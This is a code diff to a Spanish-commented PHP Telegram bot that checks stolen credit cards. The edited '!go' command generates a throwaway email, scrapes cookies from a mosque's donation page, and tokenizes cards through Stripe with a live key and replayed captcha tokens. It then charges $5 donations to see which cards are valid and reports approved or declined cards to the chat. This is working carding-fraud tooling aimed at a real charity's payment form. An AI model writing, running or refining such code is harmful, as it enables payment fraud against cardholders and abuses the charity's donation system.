@@ -1571,6 +1571,11 @@ ob_flush();
 //if (preg_match('/^(!|\/|\.)cb/', $message)) {
 
 elseif((strpos($message, "!cb") === 0)||(strpos($message, "/cb") === 0)||(strpos($message, ".cb") === 0)){
+
+
+$respuesta = "Gate no disponible por el momento !!!";
+	sendMessage($chat_id,$respuesta, $message_id);
+	die();
 	
 $lista = substr($message, 4);
 $i = preg_split('/[|:| ]/', $lista);
@@ -1886,9 +1891,9 @@ ob_flush();
 
 
 elseif((strpos($message, "!go") === 0)||(strpos($message, "/go") === 0)||(strpos($message, ".go") === 0)){
-		$respuesta = "Gate no disponible por el momento !!!";
+	/*	$respuesta = "Gate no disponible por el momento !!!";
 	sendMessage($chat_id,$respuesta, $message_id);
-	die();
+	die();*/
 //$lista = preg_replace('/\s+/', '', $lista);
 $lista = substr($message, 4);
 //$i = preg_split('/[|:| ]/', $lista);
@@ -1950,8 +1955,8 @@ curl_close($ch);
         $name = $matches1[1][0];
         preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
         $last = $matches1[1][0];
-        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
-        $email = $matches1[1][0];
+//        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
+//        $email = $matches1[1][0];
         preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
         $street = $matches1[1][0];
         preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
@@ -1964,6 +1969,55 @@ curl_close($ch);
         $postcode = $matches1[1][0];
 
 ////SACA EL TOKEN//
+$response = file_get_contents('https://www.fakemailgenerator.com');
+preg_match('/value="([^"]+)"/', $response, $matches);
+$GmailUser = $matches[1];
+//---------------------------//
+// Extraer el valor del dominio
+preg_match('/<span id="domain">([^<]+)<\/span>/', $response, $matches);
+$dominio = trim($matches[1]);
+// Eliminar espacios en blanco
+//---------------------------//
+$usr = str_replace("@", "", $dominio);
+//---------------------------//
+$email = "$GmailUser$dominio";
+	
+
+$curl = curl_init();
+curl_setopt_array($curl, [
+  CURLOPT_URL => 'https://goodbricksapp.com/icsd.org/donate',
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 30,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'GET',
+//  CURLOPT_COOKIE => 'AWSELB=3BCDDBFC041DF2CB93B1F636C2A3E3B1969F2E54E6C6C74840B85EFFD64511979300976A3A882CC4D98A48BEB2C71440EACCBBB877341DEF0ADCE0E91BC9385D1660349C; AWSELBCORS=3BCDDBFC041DF2CB93B1F636C2A3E3B1969F2E54E6C6C74840B85EFFD64511979300976A3A882CC4D98A48BEB2C71440EACCBBB877341DEF0ADCE0E91BC9385D1660349C; __stripe_mid=9ba4b24a-2af4-439e-a41d-920e0381036689ceab; __stripe_sid=453a6b5c-da6a-4251-9e1d-b527682f5d772b6c36',
+  CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
+  CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
+  CURLOPT_HTTPHEADER => [
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36',
+    'Accept-Encoding: gzip, deflate, br, zstd',
+    'Cache-Control: max-age=0',
+    'sec-ch-ua: "Brave";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
+    'sec-ch-ua-mobile: ?1',
+    'sec-ch-ua-platform: "Android"',
+    'Upgrade-Insecure-Requests: 1',
+    'Sec-GPC: 1',
+    'Accept-Language: es-US,es;q=0.6',
+    'Sec-Fetch-Site: none',
+    'Sec-Fetch-Mode: navigate',
+    'Sec-Fetch-User: ?1',
+    'Sec-Fetch-Dest: document',
+  ],
+]);
+
+$response = curl_exec($curl);
+$err = curl_error($curl);
+curl_close($curl);
+
+
+
 $curl = curl_init();
 curl_setopt_array($curl, [
   CURLOPT_URL => 'https://api.stripe.com/v1/tokens',
@@ -1973,31 +2027,39 @@ curl_setopt_array($curl, [
   CURLOPT_TIMEOUT => 30,
   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
   CURLOPT_CUSTOMREQUEST => 'POST',
-  CURLOPT_POSTFIELDS => 'card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F3d0d0fc67%3B+stripe-js-v3%2F3d0d0fc67&time_on_page=63244&key=pk_live_41FIHoENH2ilJLW1pkGdu3wb&pasted_fields=number',
+  CURLOPT_POSTFIELDS => 'guid=a5ff83d5-8f58-4ce3-bc66-46264d3217f072cfc5&muid=9ba4b24a-2af4-439e-a41d-920e0381036689ceab&sid=453a6b5c-da6a-4251-9e1d-b527682f5d772b6c36&referrer=https://goodbricksapp.com&time_on_page=23852&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiVm1SSmw2aVlRMUFsVFk4VlY0bGpGek12SkRaTktXMWxIei9ickxDUU5JRE5MdVZWSHZaeWNNRzRUSzlRS0RvUWNKai90RmhRZHpvWmRjbHRYSHZZZmhmazQ2ekxoN0NVSEdGYk5CWkRQcmdEa1ZzbWd3SXM5YnIrRCtIVGU3TDBrKzdQWVlOWlppb0xXMU1MS2Y1NTJ0Tm4rU0pHVEpQM0RPb2VMUHhKUWFWVU11Sk8yeHMrNGRsdFMyTU9uQ0RlWHgvRkd5WkxCbHJ2TnZka3ZOd2hUYTRONExWQ3BuKzRYWFVOWUZobSt4RFEzNmNuRmw0RVR2cXhCWmoxci90c3hsSVJwTzR6Ri9xeEFBS1pCZi96YzhTamxEZE9mMGNHRVIveXBiclNxOHVkWEc5aDhYNldleDZoV2FFNHJMVXdwcXFjd0grdTM5RmRvWHp3d00zaDZRT1lTZzd0OWJRYUdqdG00YVI3VCtMeGMyN3Y5L21LbjlQb0prRXpWU3pGUHVDd09aVjJMY2RqSUVlM0lHbzk4N1c3SkhmVUV1L2tENGZ5M2xFVkpVaWMydkVLWG1QV2YrNVNFd0hFTU1PNjB5empoNXlPb1pDaHpNOCs0eHBONDZYZzhQSlhGck44T09UdENpZHE5cnhycC9iby9xcE1IcnNMUkpJWStNekY4bUE3YXMrWTUvQUZjd3ppSGRpZi9hQXdiOG5BMitKc0ZqZ0xZaFI2b0JzRkh3YUEyZ2JwOVBoYm5hc29WQnFHQ0JYZVE5STFzVnJSVno4NE9hTm5OZmZPNjVIcDZvcmFtTlFzVmFvWi82RmhBVFYvMUZEYWJMU200eE9KTG9FVFIzcjIvTkZibkZodjVKZlFBU3M0Mmo4cVc5akhoQXUvbkg4RUdWRkh3b3kwOUdVckFiS3NGM09IU1ZSVWNuUEhGU2l5RGJSckRtVFZCTStZcElESUhCZmp6b1RocWZDelYvM2ZMdmMrTXQyNXJmWFp2bXhnTUFwYnNLUXNsbjBwZDIyVTFTV0JlWWtISDlJbi9oQkpocWV3WGpBVlVRanhZbGhOSEpqb05oYmFZYUdLSU5NRHRPdnVDQlhqVEpGaUc0anRzL2cyZXdTMks5TUc2QWg5RzBpK05HZDBIMm0vQW9tUWZGQ1VqOFQ3K2g4cDhNMHZWWllHcFR3bGFBRlNULzhzdGtGM3BVVnd0cHYzUVl2ekFwN1BoUjNVNUVvZnFDWEp3cTc4RkJYK2YvdWlITWx0Zjh4NVQ2cGxvcTF6bktUZFlnNHBaOGJUb0IwSG1FbEpGRW04eWpVdmQva3lGK0tQaTdINEVJM1NZOVlPSzZ2a1g2R1NvWVhVOVV6VjBnU3Y3SmNOalBzaVU0RVpsVHdwWmNrZlJLTkZ1Z3dyUTErQVczQ0JGdE42ZzBSNVc1NUM4cFI2ZGtGRFNBMHUrb2FtY1VQYTUrOGd2anYxOHlveXEvOWZkYnhpQk9INjNBYzZOZ1MvdnBqWDExSmY2dUVmWUltT0lFSC9ZYjZ3c1dnNWRzQndZK0xrWFNkUEMwRUhCUlo5N2h2Ty9qNnBqczFrN1J6Q3BtWWJ2VEh2QWhRWFI0YjRSa05oY0RjcUVEbHFDNnhER3h0ZURBZVFDZFR3Zzd5Y3hEMmQ4TEdGSFkrRGZJcm1FYnA3R0FJamp4UFdvTTZCdHZNdWZETE5HZncxTnIwMkRLQisrbkVZWjhhOWlTTUNqRjMvV05BQmlUVnQyT2JmMUUxakQ4dVArV09UdHFNbGtPcnIxdWNJaTZpaVJnNGVIVGk1UzdBMEZZeGZLRDhsZ3hUTEpCbk1odU1KOHlBTE9hYkxtaDJteXp0Zitkc045UG1nNWR3UnJibFArUTlNdGNEUHhjS3pGdGNVZlRaU3E0TVZiNjZPU01qR0YwUFZtV0NwT2Y2OUoyaEhBcmhUK1h2dmdBN0Iwcld0c2NONUgzQlZaS1R6cTRPZmJhQzJHUFYxa24wU2Ntd1FWTEN2RlNXMnNGY2F0MUFPSG9TNkRtVlVHOWlyZDl4ZFBvQUJISkZsT3A4aWRHWk9ZSEFOTnRaekVkVmkyVVYwdjZCK1dJTWIyb2tlY0xkK1FyaDNzQkkza2M0TDdzVmtEYy9sV3Q1dHQ3T1E0WktndFBsUm1VZmcvcHJXWkMxMnc5MTNNMUZtVFZxeFIrd053RElsOU5ad29VamtqTXVaQ3RRRmtFRlFteFhScldJN3JQb0pZbFdwUERzNFdBVTZURmRnQlAxcGk5Q3R2R2F2UnA2UUhpTlJtUkVkUlB4S1MrV2dNcitLOFlMZ0tjZkkzWUdrUlQ2eFQrZ3lRQVNzeWxBU1VoMkVNSXl0b29mQ1FZdzV4WXZzZmg3MVpMbmc5OUNhYXVndlJyelRHSEJrV01Fbi9IYXdLSU1JeGFpa3A3N0dDdmJqZU5PYkh3UVZRZGJWOERqQU1mTzhRZVpIQjNPT25FQkFrT09Rbi81ZFVobFlTWjRuZ0tpL2VVUVdqUlJWaThnZm95SXJzUDRtUW9mV1VMVThiTXkzT3VVd3ZWS2hNNjlnME9yQ1VidGZQNzNkSXhIU1Q2YUg1bzMyaXoreGw5Y0JxTUtobkpyeDdMZjJqTkY5RnZwakN3VDZ6c3lsSStBWEtUNFplRmdJQ1JrZjZuUlhXTnlqMGMwKzQ4MzNvbXIwL0g2YVhaa0RBU3U5ZjU1UGw0eG9PaVZYeHIyak52YWdLTkt0VTY0S2F3PT0iLCJleHAiOjE3NDU0Mzc3ODcsInNoYXJkX2lkIjoyMjE5OTYwNzMsImtyIjoiM2RiZGFiNDYiLCJwZCI6MCwiY2RhdGEiOiJnMHE1Qm5vc2YzaEtWZmtNbGE2TE9iNUxOVlQwdDhxQ0czbWtwMkdIKzY3YjlmcnRWWE04bHBsMENVSFZhako3L0VoVGhXcy9mdEk4emV0RkFIbUlBNTBvczl3RjNEQkRReHlySDFpWHg1TVduN3NlTEFsWmo1bnpMWEJ3NTY1SlhHVWZiQWdqZnRoeEI1NjRqOCtiMmhpTWQ5SzBkVjFxUzUzczNuMjlsa29pbEp6blZLVlV4cnYzYlZBaDRubjFGaXVuMzNEa0Y3clNlemhkIn0.b8TxuC6YySDuu_B4dcwCqlV6ltGNaAf1u1xglZqBcSs&payment_user_agent=stripe.js/d2577f3d23; stripe-js-v3/d2577f3d23; card-element&key=pk_live_41FIHoENH2ilJLW1pkGdu3wb',
   CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
   CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
   CURLOPT_HTTPHEADER => [
-    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36',
     'Accept: application/json',
+    'Accept-Encoding: gzip, deflate, br, zstd',
     'Content-Type: application/x-www-form-urlencoded',
     'sec-ch-ua-platform: "Android"',
+    'sec-ch-ua: "Brave";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
+    'sec-ch-ua-mobile: ?1',
+    'sec-gpc: 1',
     'accept-language: es-US,es;q=0.6',
     'origin: https://js.stripe.com',
+    'sec-fetch-site: same-site',
+    'sec-fetch-mode: cors',
+    'sec-fetch-dest: empty',
     'referer: https://js.stripe.com/',
+    'priority: u=1, i',
   ],
 ]);
 
 $response = curl_exec($curl);
 $err = curl_error($curl);
 $json = json_decode($response, true);
-$token = $json["id"];
+$id = $json["id"];
 $ip = $json["client_ip"];
 curl_close($curl);
-//echo "$token\n";
 
+echo "$id\n";
 //---------------PRUEBA LAS CCS EN PAGINA DE DONACION---------------//
-$curl = curl_init();
 
+$curl = curl_init();
 curl_setopt_array($curl, [
   CURLOPT_URL => 'https://goodbricksapp.com/icsd.org/donate',
   CURLOPT_RETURNTRANSFER => true,
@@ -2006,16 +2068,25 @@ curl_setopt_array($curl, [
   CURLOPT_TIMEOUT => 30,
   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
   CURLOPT_CUSTOMREQUEST => 'POST',
-  CURLOPT_POSTFIELDS => 'g-recaptcha-response=03AFcWeA79gN-cRZCqHC86fNgGHKUYB4kIXpZwh0Asad6-9xnWuLyR598WPDh3DdhVZgKmFEgqjW4Q4wLjH4ILy_rOPovVGEKpaTqejsK3jqN2lWF6AU_UZDSvSf99D3GD8mKFPb2DDKW5O3T1voJNde8qlmA6uS7DCaNMQ9snUNXkWp-hRNpCYM3F4G9FtsNH89m4Ym1ASF9slZMhfS50axXAjeTUZqjHQ0wyqWMUFo8egBpY-i0SW8jvqYoLnzwNXIQ8MKZ2jBU5VPBez8_2z_GKvhqX_Chm-uVPDiTqneR4H83cCyvnoCHB9cnnRZbZSsRA2rDNu7mys0fxmmfskLoWhNM872ppHipa0d9Cv6wZL_7ZRqmk4IpL0SNqtAfm1-LcaVJSja0ZR5ZD4hlvqteyna-rP_ypt04EkUuAt__Nf0MjSkoDSRziZDTyiIPTUpumXTbNzOId93sJlQF9ZFmCjJOEjmJs5eri9yah7_1N4y-R538eHVPvfZJeROfFyPewhTJgJ6m-t2qgbczqOhhalXpdmy3xwSpm1b6lUe4fqAb5fLgOmPEwuMSiGXIW4cTQp2X7CLYehyrGUUA6HeRjHbxELJJZFvzTfR6nrYS5W-XWAJBRNPKw45Oo4voxRVCQfJMRb2Th030Wro62n8lqduUZ2-TcNpqmm0GxywcDRiGshF9K11kQjnY4gyNmwsBf7fdjiGgPsUWzNzIbA0IPUztJDU_FoM-aU40VVQXghlsNab8PMfnHTnAVUpRrIZ-RRwPMuyKLLot2YqmwwxYyuwdbsPAZ2HkiXL6T3ypjkNWOBfxqbkmgfLQtxRnmwRnizn0ZMTyrccA_EzB01MHiAm4qheWbSteU7pt6160Va-pvpG_KTrJUxQoMCflqNIPHfuMMBtB8GQ7ND4TVHgOqPtM6t-7MyA&token='.$token.'&clientIp='.$ip.'&categoryAmount=5&paymentIterations=0&categoryName=masjid-operations-2025&firstName='.$name.'&lastName='.$last.'&email='.$email.'&customerEmailValidation=&phone='.$phone.'&addressStreet='.$street.'&addressApt=&addressCity='.$city.'&addressState='.$state.'&addressZipCode='.$postcode.'',
+  CURLOPT_POSTFIELDS => 'g-recaptcha-response=03AFcWeA65bHNOmDSPdG_9gB6c9EX9zSMnjWrR27HXOwDFJS1LJ4aePWFq2uf8mKssZYu7FHz8O76-1iQwTBcX2qX1HYb8UeAzRZNYkDoHMQ-c_ojltBWijO6cWa2TlKL0Guq97UV2-T0O85Xzx33C7j8WTd5EGElpt5u2ws8KXYgyL1DQA-PHXhj_eVR6SAxXKyHYVzPCavKzav1PrQKY5TALYmaqdGDmmmxzVaAdi0PfgNPg96UTEPrWunRAToUbB4j0q19FRsWi82Aj5n3QZaCxiDzaoog0oWY-M12AMuhsGkMnoL6R8__vk7NJvpEq2IFnsplix1xBrkNnEWsyPhgoRq0Ew13-sY1CUWd-LZMOpIbK97lCObapeTYk0WL9Ge4t3QjctJvnmqfadMZR8GuI_az9hfK3x9wx9JbN6_91Wy8EWXwQB4Bi1eqkqFWMlpuMnfNq6tPPDvAMny9MHQV9e1UIM0S5V8YJCmzO9hfkN-1hTEoPKssCV5DkKVUZOyqwwfI_a1XUXKP66duM4lPkwnS6HzQyoXxCRtTXUWHuFhYuM92d74jmBLGiYzk5E4UyfJlJMFOQKDybNtnl4ejBBbRxwHr-nZFRHZ9nYA5AcrHSn5_OOqsw3XqK51p-Z-NDlvdtbrQ6tnHKioNZm04-KBv54JJSeJeIbP9OCcvJmrgqggDplvTyPIrLHChE-KZkoIlZiHPcpI8pLwnsBl9tpofw-naN_FS3rJb-s2fJV1sslyw0WFeJtiMH8Y2Jn-FE4b7YdvTxSvWvkhiMnAZeYz1nqqLTAO5Y9a0fpCSZVfrsAPQD_U697yodO0C23pm6UoAft8aJRmw_k-pWR3vhIkSzrA4QVi962k_ZbhEAT01tdscFeN5dE4-f6K7crguxy7WrzpyeRtK9VJsUzTJvQDkDb4RBmXX2Y75P-d9qMCjsgSDg5UgwHUI7E8baYkKb7b7Y69JfkvQzAxTE5YJJ3BgD-ugE2Q&token='.$id.'&clientIp='.$ip.'&categoryAmount=5&paymentIterations=0&categoryName=masjid-operations-2025&firstName='.$name.'&lastName='.$last.'&email='.$email.'&customerEmailValidation=&phone='.$phone.'&addressStreet=&addressApt=&addressCity=&addressState=&addressZipCode=',
   CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
   CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
-//  CURLOPT_COOKIE => 'AWSELB=3BCDDBFC041DF2CB93B1F636C2A3E3B1969F2E549B084AFBFC941618DBECF951F761AB9DF0241960432B90F895A2BFFFD4DBCE2F350BEBBA742F70A5B1CDB1D610D29AA3; AWSELBCORS=3BCDDBFC041DF2CB93B1F636C2A3E3B1969F2E549B084AFBFC941618DBECF951F761AB9DF0241960432B90F895A2BFFFD4DBCE2F350BEBBA742F70A5B1CDB1D610D29AA3; __stripe_mid=27a8675f-023c-45ac-9483-16bd0a1b7b88bfab33; __stripe_sid=17eb8870-f952-48b8-b39f-f559cd90e22dde35cd',
+//CURLOPT_COOKIE => 'AWSELB=3BCDDBFC041DF2CB93B1F636C2A3E3B1969F2E54E6C6C74840B85EFFD64511979300976A3A882CC4D98A48BEB2C71440EACCBBB877341DEF0ADCE0E91BC9385D1660349C; AWSELBCORS=3BCDDBFC041DF2CB93B1F636C2A3E3B1969F2E54E6C6C74840B85EFFD64511979300976A3A882CC4D98A48BEB2C71440EACCBBB877341DEF0ADCE0E91BC9385D1660349C; __stripe_mid=9ba4b24a-2af4-439e-a41d-920e0381036689ceab; __stripe_sid=453a6b5c-da6a-4251-9e1d-b527682f5d772b6c36',
   CURLOPT_HTTPHEADER => [
-    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
-    'Content-Type: application/x-www-form-urlencoded',
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36',
+    'Accept-Encoding: gzip, deflate, br, zstd',
+//    'Content-Type: application/x-www-form-urlencoded',
     'sec-ch-ua-platform: "Android"',
+    'X-Requested-With: XMLHttpRequest',
+    'sec-ch-ua: "Brave";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
+    'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
+    'sec-ch-ua-mobile: ?1',
+    'Sec-GPC: 1',
     'Accept-Language: es-US,es;q=0.6',
     'Origin: https://goodbricksapp.com',
+    'Sec-Fetch-Site: same-origin',
+    'Sec-Fetch-Mode: cors',
+    'Sec-Fetch-Dest: empty',
     'Referer: https://goodbricksapp.com/icsd.org/donate',
   ],
 ]);
@@ -2023,18 +2094,6 @@ curl_setopt_array($curl, [
 $response = curl_exec($curl);
 $err = curl_error($curl);
 $json = json_decode($response, true);
-/*
-$respo = $json["status"];
-if (empty($respo)){
-$respo = explode(';', $json['message'])[0];
-}
-
-if (empty($respo)){
-$mensaje = preg_match('/<p>(.*?)<\/p>/', $response, $matches);
-$respo = $matches[1];
-} else {
-$respo = "Service Unavailable";
-}*/
 
 $respo = '';
 
@@ -2076,20 +2135,22 @@ unlink('cookie.txt');
 $retri = handleComando($card); //Checa cuntas veces se calo la misma ccs//
 
 if (array_in_string($respo, $live_array)) {
-    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 5$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Approved! ✅\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐑𝐞𝐭𝐫𝐢𝐞𝐬: ".$retri."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
+    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 5$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝! ✅\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐑𝐞𝐭𝐫𝐢𝐞𝐬: ".$retri."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
     $live = True;
 } elseif (strpos($respo, 'This transaction cannot be processed.') !== false || strpos($respo, 'Your card was declined.') !== false) {
-    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 5$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Declined ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐑𝐞𝐭𝐫𝐢𝐞𝐬: ".$retri."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
+    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 5$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐑𝐞𝐭𝐫𝐢𝐞𝐬: ".$retri."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
     $live = False;
 } else {
-    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 5$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: GATE ERROR ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐑𝐞𝐭𝐫𝐢𝐞𝐬: ".$retri."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
+    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 5$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐑𝐞𝐭𝐫𝐢𝐞𝐬: ".$retri."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
     $live = False;
 }
 
 if ($live) {
     editMessage($chat_id, $respuesta, $id_text);
+	die();
 } else {
     editMessage($chat_id, $respuesta, $id_text);
+	die();
 }
 
 //--------FIN DEL CHECKER MERCHAND - CHARGED--------/
